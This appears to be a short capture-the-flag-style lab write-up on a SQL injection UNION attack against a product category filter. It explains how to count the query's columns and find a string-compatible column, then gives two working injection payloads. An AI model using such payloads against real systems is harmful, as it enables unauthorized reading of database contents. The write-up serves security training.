
## Description:

this lab contains a SQL injection vulnerability in the product category filter, it is possible to use a UNION attack to retrieve data from other tables

to construct this attack it is first necessary to determine the number of columns returned by the query, the next step is to identify a column that is compatible with string data

the lab will provide a random value that must be returned to solve the lab

## Solution:

	' UNION SELECT NULL,NULL,NULL-- \\ determining the number of columns returned

	' UNION SELECT NULL,'43TjdH',NULL-- \\ retrieving the string after identifying (by trial and error) that the second column is compatible with string data

